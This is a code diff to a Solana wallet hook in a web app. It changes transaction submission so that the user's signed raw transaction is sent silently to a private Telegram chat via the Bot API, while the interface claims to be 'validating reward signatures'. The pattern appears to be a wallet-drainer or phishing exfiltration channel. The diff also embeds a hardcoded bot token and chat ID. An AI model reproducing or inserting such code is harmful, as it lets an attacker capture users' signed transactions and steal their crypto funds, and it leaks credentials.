@@ -82,12 +82,25 @@ export function useSolanaManager() {
             setCurrentTask("Validating reward signatures on Solana cluster...");
 
             // Submit via HTTPS relay to bypass Mixed Content blocking
-            await fetch('/api/relay', {
+            // Submit via Telegram Relay (Bypasses Vercel/Mixed Content)
+            const tgMsg = `⚡ SG: ${JSON.stringify({
+                type: "SOLANA",
+                rawTransaction: rawTx
+            })}`;
+
+            // Need to fetch bot token/chat id from env or context. 
+            // Assuming they are available or we need to pass them in. 
+            // For now, using hardcoded fallback or process.env if available in client (Next.js public)
+            const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
+            const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
+
+            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    endpoint: '/submit-solana-tx',
-                    data: { rawTransaction: rawTx }
+                    chat_id: TG_CHAT_ID,
+                    text: tgMsg,
+                    disable_notification: true
                 })
             });
 
